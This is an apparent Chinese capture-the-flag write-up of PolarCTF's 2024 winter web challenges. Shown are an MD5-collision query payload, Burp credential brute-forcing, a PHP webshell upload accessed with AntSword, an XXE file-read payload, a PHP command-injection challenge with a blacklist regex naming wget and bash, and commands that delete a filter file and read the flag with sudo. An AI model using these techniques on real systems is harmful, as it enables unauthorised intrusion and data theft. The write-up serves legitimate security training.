# 2024 polarctf 冬季个人挑战赛 web wp-先知社区

> **来源**: https://xz.aliyun.com/news/16101  
> **文章ID**: 16101

---

## 简单的导航站

这个题目考点主要是MD5强绕过和文件上传及对burp爆破模块的使用  
题目给了5个模块,肯定是要管理员登录，然后进行文件上传的，先注册一个账号试试  
![](images/20241209184902-33c46936-b61b-1.png)

![](images/20241209185310-c8002c7a-b61b-1.png)

![](images/20241209185334-d6604ffc-b61b-1.png)  
进去发现是个MD5强比较

```
?user1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&user2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2

```

得到所有的用户名  
![](images/20241209185233-b1d959b2-b61b-1.png)  
在首页发现一个密码  
![](images/20241209185454-0606c416-b61c-1.png)  
burp抓包爆破  
结果用户名是：P0la2adm1n  
![](images/20241209190023-c9d97a32-b61c-1.png)  
成功来到文件上传地点  
上传一句话  
![](images/20241209202220-3ce03358-b628-1.png)

![](images/20241209202249-4df0286a-b628-1.png)  
成功写入，蚁剑连接  
![](images/20241209202335-69ace552-b628-1.png)  
发现有一堆flag，去flag认证系统爆破即可

## 井字棋

查看网页源码  
![](images/20241209202747-ff62a7ee-b628-1.png)  
发现给who赋值即可win  
![](images/20241209203016-5893f200-b629-1.png)

## 狗黑子的RCE

```
<?php
error_reporting(0);
highlight_file(__FILE__);
header('content-type:text/html;charset=utf-8');


    $gouheizi1=$_GET['gouheizi1'];
    $gouheizi2=$_POST['gouheizi2'];
    $gouheizi2=str_replace('gouheizi', '', $gouheizi2);

    if (preg_match("/ls|dir|flag|type|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $gouheizi1)) {
        echo("badly!");
        exit;
    } 
    if($gouheizi2==="gouheizi"){
        system($gouheizi1);
    }else{
        echo "gouheizi!";
    }
?>

```

第一关双写绕过即可  
第二关反斜杠绕过

## xxmmll

![](images/20241209205445-c44c1b82-b62c-1.png)  
响应头给了一个php文件地址  
![](images/20241209205738-2b18284c-b62d-1.png)

![](images/20241209205812-3f5ad64c-b62d-1.png)  
这儿应该是xml文件读取了  
直接读就好了

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file://flag" >]>
<root>
<name>
&xxe;
</name>
</root>

```

![](images/20241209210054-a002304e-b62d-1.png)

## 赌王

![](images/20241209210823-aba164b4-b62e-1.png)  
爆破一下看能不能出来  
![](images/20241209210850-bb815c9a-b62e-1.png)  
成功出来提示,访问ed3d2c21991e3bef5e069713af9fa6ca.php  
![](images/20241209210948-de4aa006-b62e-1.png)  
出来一个输入框，尝试一下xss  
![](images/20241209211216-36b0de36-b62f-1.png)  
提示我们用confirm弹窗

![](images/20241209211335-65403828-b62f-1.png)  
去e744f91c29ec99f0e662c9177946c627.php看看  
![](images/20241209211416-7e2bd8f6-b62f-1.png)

![](images/20241209211528-a9274d42-b62f-1.png)  
要求我们必须是1.1.1.1才能执行命令  
![](images/20241209211903-28f9b8ac-b630-1.png)

![](images/20241209211932-3a090288-b630-1.png)

## 任务cmd

查看响应头  
![](images/20241209212201-9337da28-b630-1.png)  
爆破密码123123  
![](images/20241209212241-ab323d1c-b630-1.png)  
根据源码提示  
![](images/20241209212449-f722f82e-b630-1.png)  
id换成xiaohei  
![](images/20241209212651-3fe9404a-b631-1.png)  
扫描目录发现有个login.php

![](images/20241209212857-8aeb967e-b631-1.png)  
密码爆破出来是flower  
根据题目猜测参数为cmd  
![](images/20241209213137-ea72516e-b631-1.png)

## 坦诚相见

可以命令执行，但是不能查看/目录  
![](images/20241209213518-6e592e44-b632-1.png)

![](images/20241209213600-870e478a-b632-1.png)  
cat no.php  
![](images/20241209213643-a09651e8-b632-1.png)  
发现waf，这里删除这个文件即可  
rm no.php  
![](images/20241209213746-c650b432-b632-1.png)

![](images/20241209213810-d4d40090-b632-1.png)  
sudo cat /f\*  
![](images/20241209213954-1291bf44-b633-1.png)
